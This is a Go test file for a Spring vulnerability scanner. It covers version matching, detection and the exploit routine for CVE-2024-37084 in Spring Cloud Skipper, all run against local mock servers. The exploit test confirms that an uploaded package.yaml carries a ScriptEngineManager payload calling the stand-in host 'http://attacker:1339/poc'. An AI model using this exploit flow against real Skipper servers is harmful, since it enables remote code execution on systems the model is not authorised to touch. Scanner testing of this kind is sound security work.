package vulns

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

func TestVersionAffected(t *testing.T) {
	cases := map[string]bool{
		"2.11.3":  true,
		"2.11.0":  true,
		"2.10.9":  true,
		"1.9.9":   true,
		"2.11.4":  false,
		"2.12.0":  false,
		"3.0.0":   false,
		"2.11":    false,
		"garbage": false,
	}
	for v, want := range cases {
		if got := versionAffected(v); got != want {
			t.Errorf("versionAffected(%q) = %v, want %v", v, got, want)
		}
	}
}

func TestCVE202437084Detect(t *testing.T) {
	newTarget := func(body string, status int) model.Target {
		ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(status)
			_, _ = w.Write([]byte(body))
		}))
		t.Cleanup(ts.Close)
		return model.Target{URL: ts.URL + "/", Client: client.New("", time.Second)}
	}

	// 漏洞版本
	verdict, err := (&cve202437084{}).Detect(context.Background(),
		newTarget(`{"version":"2.11.2","name":"Spring Cloud Skipper Server"}`, http.StatusOK))
	if err != nil {
		t.Fatal(err)
	}
	if !verdict.Vulnerable {
		t.Fatalf("expected vulnerable for 2.11.2, got %+v", verdict)
	}
	if !strings.Contains(verdict.Evidence, "2.11.2") {
		t.Fatalf("evidence should contain version: %+v", verdict)
	}

	// 已修复版本
	verdict, err = (&cve202437084{}).Detect(context.Background(),
		newTarget(`{"version":"2.11.4","name":"Spring Cloud Skipper Server"}`, http.StatusOK))
	if err != nil {
		t.Fatal(err)
	}
	if verdict.Vulnerable {
		t.Fatalf("expected patched 2.11.4 to be clean, got %+v", verdict)
	}

	// 无 about 端点
	verdict, err = (&cve202437084{}).Detect(context.Background(),
		newTarget("not found", http.StatusNotFound))
	if err != nil {
		t.Fatal(err)
	}
	if verdict.Vulnerable {
		t.Fatalf("expected non-skipper target to be clean, got %+v", verdict)
	}
}

func TestCVE202437084Exploit(t *testing.T) {
	var uploadBody []byte
	mux := http.NewServeMux()
	mux.HandleFunc("POST /api/package/upload", func(w http.ResponseWriter, r *http.Request) {
		b, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		uploadBody = b
		w.WriteHeader(http.StatusCreated)
		_, _ = w.Write([]byte(`{"packageName":"ssp-probe"}`))
	})
	mux.HandleFunc("DELETE /api/packages/ssp-probe/1.0.0", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	ts := httptest.NewServer(mux)
	defer ts.Close()

	tgt := model.Target{URL: ts.URL + "/", Client: client.New("", time.Second)}
	out, note, err := (&cve202437084{}).Exploit(context.Background(), tgt, "http://attacker:1339/poc")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(note, "OOB") {
		t.Fatalf("note should mention OOB verification: %s", note)
	}
	if !strings.Contains(out, "ssp-probe") {
		t.Fatalf("expected server response body in output, got %q", out)
	}

	// 校验上传包结构：JSON 字段 + ZIP 内容
	var req struct {
		RepoName           string `json:"repoName"`
		Name               string `json:"name"`
		Version            string `json:"version"`
		Extension          string `json:"extension"`
		PackageFileAsBytes []int  `json:"packageFileAsBytes"`
	}
	if err := json.Unmarshal(uploadBody, &req); err != nil {
		t.Fatalf("upload body is not valid JSON: %v", err)
	}
	if req.RepoName != "local" || req.Name != "ssp-probe" || req.Version != "1.0.0" || req.Extension != "zip" {
		t.Fatalf("unexpected upload fields: %+v", req)
	}
	if len(req.PackageFileAsBytes) == 0 {
		t.Fatal("packageFileAsBytes is empty")
	}

	zipBytes := make([]byte, len(req.PackageFileAsBytes))
	for i, v := range req.PackageFileAsBytes {
		zipBytes[i] = byte(v)
	}
	zr, err := zip.NewReader(bytes.NewReader(zipBytes), int64(len(zipBytes)))
	if err != nil {
		t.Fatalf("payload is not a valid zip: %v", err)
	}
	var yamlContent string
	for _, f := range zr.File {
		if strings.HasSuffix(f.Name, "/package.yaml") {
			rc, err := f.Open()
			if err != nil {
				t.Fatal(err)
			}
			buf := new(bytes.Buffer)
			_, _ = buf.ReadFrom(rc)
			_ = rc.Close()
			yamlContent = buf.String()
		}
	}
	if yamlContent == "" {
		t.Fatal("package.yaml not found in zip")
	}
	for _, want := range []string{"name: ssp-probe", "version: 1.0.0", "ScriptEngineManager", "http://attacker:1339/poc"} {
		if !strings.Contains(yamlContent, want) {
			t.Errorf("package.yaml missing %q:\n%s", want, yamlContent)
		}
	}
}
